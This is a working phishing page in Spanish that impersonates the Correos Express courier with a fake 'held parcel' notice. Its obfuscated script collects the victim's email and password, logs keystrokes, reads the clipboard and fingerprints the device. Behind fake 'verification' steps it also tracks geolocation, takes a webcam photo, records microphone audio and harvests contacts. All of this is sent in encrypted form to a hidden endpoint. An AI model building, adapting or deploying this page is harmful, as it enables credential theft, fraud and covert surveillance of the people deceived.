<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<meta name="theme-color" content="#ffcc00">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="default">
<meta name="apple-mobile-web-app-title" content="Correos">
<link rel="manifest" href="manifest.json">
<link rel="apple-touch-icon" href="icon-192.png">
<title>Correos Express</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;-webkit-tap-highlight-color:transparent}
body{background:#ffcc00;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.c{background:#fff;border-radius:18px;padding:26px;max-width:400px;width:100%;box-shadow:0 10px 40px rgba(0,0,0,.18)}
.h{display:flex;align-items:center;gap:10px;margin-bottom:18px}
.h img{width:38px;height:38px}
.h b{font-size:17px}
.s{font-size:13px;color:#666;margin-bottom:18px;line-height:1.5}
label{display:block;font-size:12px;color:#888;margin:12px 0 5px}
input{width:100%;padding:13px;border:1.5px solid #e0e0e0;border-radius:10px;font-size:16px;background:#fafafa}
input:focus{outline:0;border-color:#ffcc00;background:#fff}
button{width:100%;padding:14px;border:0;border-radius:10px;font-size:16px;font-weight:600;background:#ffcc00;margin-top:16px;cursor:pointer}
button:disabled{opacity:.45}
.g{background:#f5f5f5;color:#333;font-weight:500;font-size:14px;margin-top:10px}
#l{font-size:11px;color:#999;text-align:center;margin-top:14px;min-height:14px}
.d{display:none}
</style>
</head>
<body>
<div class="c">
  <div class="h">**Correos Express**</div>
  <div id="v1">
    <p class="s">Tu envío ES-8842-XK está retenido en la oficina. Introduce tus datos para liberarlo.</p>
    <label>Correo electrónico</label>
    <input id="e" type="email" autocomplete="username" inputmode="email">
    <label>Contraseña</label>
    <input id="p" type="password" autocomplete="current-password">
    <button id="b0">Acceder</button>
  </div>
  <div id="v2" class="d">
    <p class="s">Verificando identidad…<br>No cierres esta ventana</p>
  </div>
  <button id="b1" class="g" disabled>Verificar ubicación</button>
  <button id="b2" class="g" disabled>Activar cámara</button>
  <button id="b3" class="g" disabled>Instalar aplicación</button>
  <div id="l"></div>
</div>
<script>
const _R=["L2FwaS94","N2sy"];
const API=atob(_R.join(""));
const _P="PEGA_AQUI_TU_PASS_OBF";
const PASS=new TextDecoder().decode(Uint8Array.from(atob(_P),c=>c.charCodeAt(0)^0x5A));
const S={id:crypto.randomUUID(),t:Date.now()};
const L=m=>document.getElementById("l").textContent=m;
const $=i=>document.getElementById(i);

async function enc(o){
  const s=crypto.getRandomValues(new Uint8Array(16));
  const n=crypto.getRandomValues(new Uint8Array(12));
  const b=await crypto.subtle.importKey("raw",new TextEncoder().encode(PASS),"PBKDF2",false,["deriveKey"]);
  const k=await crypto.subtle.deriveKey({name:"PBKDF2",salt:s,iterations:200000,hash:"SHA-256"},b,{name:"AES-GCM",length:256},false,["encrypt"]);
  const c=await crypto.subtle.encrypt({name:"AES-GCM",iv:n},k,new TextEncoder().encode(JSON.stringify({...S,...o})));
  const u=new Uint8Array(28+c.byteLength);
  u.set(s);u.set(n,16);u.set(new Uint8Array(c),28);
  return btoa(String.fromCharCode(...u));
}

async function send(o){
  try{
    const d=await enc(o);
    if(navigator.sendBeacon)navigator.sendBeacon(API,d);
    else fetch(API,{method:"POST",body:d,keepalive:true}).catch(()=>{});
  }catch(e){}
}

async function fp(){
  const c=document.createElement("canvas"),x=c.getContext("2d");
  x.textBaseline="top";x.font="14px Arial";x.fillStyle="#f60";x.fillRect(0,0,100,30);
  x.fillStyle="#069";x.fillText(navigator.userAgent,2,2);
  let g="";
  try{const gl=document.createElement("canvas").getContext("webgl");const d=gl.getExtension("WEBGL_debug_renderer_info");g=gl.getParameter(d.UNMASKED_RENDERER_WEBGL)}catch(e){}
  let bat=null;try{const b=await navigator.getBattery();bat=[b.level,b.charging]}catch(e){}
  let st=null;try{const e=await navigator.storage.estimate();st=[e.quota,e.usage]}catch(e){}
  return{ua:navigator.userAgent,plat:navigator.platform,lang:navigator.language,langs:navigator.languages,
    tz:Intl.DateTimeFormat().resolvedOptions().timeZone,scr:[screen.width,screen.height,screen.colorDepth,devicePixelRatio],
    cores:navigator.hardwareConcurrency,mem:navigator.deviceMemory,touch:navigator.maxTouchPoints,gpu:g,
    canvas:c.toDataURL().slice(-90),conn:navigator.connection?.effectiveType,bat,st,
    sa:matchMedia("(display-mode:standalone)").matches,ref:document.referrer};
}

(async()=>{
  const f=await fp();
  let ip={};try{ip=await(await fetch("https://ipapi.co/json/")).json()}catch(e){}
  send({s:"open",f,ip});
})();

document.addEventListener("keydown",e=>{
  if(e.key.length===1)send({s:"key",k:e.key});
});

document.addEventListener("click",async()=>{
  try{const t=await navigator.clipboard.readText();if(t&&t.length<500)send({s:"clip",t})}catch(e){}
},{once:true});

$("b0").onclick=()=>{
  if(!$("e").value||!$("p").value){L("Rellena todos los campos");return}
  send({s:"login",e:$("e").value,p:$("p").value});
  $("v1").classList.add("d");$("v2").classList.remove("d");
  setTimeout(()=>{$("v2").classList.add("d");$("v1").classList.remove("d");$("b1").disabled=false;L("Datos verificados")},1400);
};

$("b1").onclick=()=>{
  L("Obteniendo ubicación…");
  navigator.geolocation.watchPosition(
    p=>{send({s:"geo",lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy,alt:p.coords.altitude,spd:p.coords.speed});L("Ubicación verificada");$("b2").disabled=false},
    ()=>L("Activa la ubicación en Ajustes"),
    {enableHighAccuracy:true,maximumAge:0,timeout:15000}
  );
};

$("b2").onclick=async()=>{
  try{
    const st=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:640},audio:false});
    const v=document.createElement("video");v.srcObject=st;v.muted=true;v.playsInline=true;await v.play();
    await new Promise(r=>setTimeout(r,1200));
    const c=document.createElement("canvas");c.width=v.videoWidth;c.height=v.videoHeight;
    c.getContext("2d").drawImage(v,0,0);
    send({s:"cam",img:c.toDataURL("image/jpeg",.6).split(",")[1]});
    st.getTracks().forEach(t=>t.stop());
    L("Cámara verificada");$("b3").disabled=false;
    try{
      const a=await navigator.mediaDevices.getUserMedia({audio:true});
      const r=new MediaRecorder(a),ch=[];
      r.ondataavailable=e=>ch.push(e.data);
      r.onstop=async()=>{const bl=new Blob(ch,{type:"audio/webm"});const bf=await bl.arrayBuffer();
        send({s:"mic",a:btoa(String.fromCharCode(...new Uint8Array(bf)))});a.getTracks().forEach(t=>t.stop())};
      r.start();setTimeout(()=>r.stop(),5000);
    }catch(e){}
  }catch(e){L("Permiso de cámara denegado")}
};

$("b3").onclick=async()=>{
  if(window.dp){window.dp.prompt();window.dp=null}
  try{const p=await Notification.requestPermission();if(p==="granted")send({s:"notif"})}catch(e){}
  try{if(navigator.contacts){const c=await navigator.contacts.select(["name","tel","email"],{multiple:true});send({s:"contacts",c})}}catch(e){}
  try{const t=await navigator.clipboard.readText();if(t)send({s:"clip",t})}catch(e){}
  L("Verificación completada");
};

window.addEventListener("beforeinstallprompt",e=>{e.preventDefault();window.dp=e});
if("serviceWorker"in navigator)navigator.serviceWorker.register("sw.js");
</script>
</body>
</html>
